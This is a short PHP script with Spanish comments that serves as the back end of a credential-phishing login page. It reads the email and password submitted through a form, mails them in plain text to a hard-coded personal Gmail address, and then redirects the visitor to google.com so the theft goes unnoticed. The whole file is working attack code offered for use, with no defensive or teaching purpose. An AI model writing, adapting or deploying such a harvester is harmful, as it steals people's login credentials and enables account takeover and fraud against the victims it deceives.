<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Enviar correo electrónico
    $to = "camargolizarazonicolas@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = "From: Camargolizarazonicolas@gmail.com"; // Cambia esto por tu dirección de correo

    // Enviar el correo
    $mailSent = mail($to, $subject, $message, $headers);

    if ($mailSent) {
        echo "¡Correo enviado con éxito!";
        
        // Redirigir a Google.com después de 2 segundos
        header("refresh:2;url=https://www.google.com");
        exit(); // Asegurarse de que el script se detenga después de la redirección
    } else {
        echo "Error al enviar el correo. Por favor, inténtalo de nuevo.";
    }
}
?>
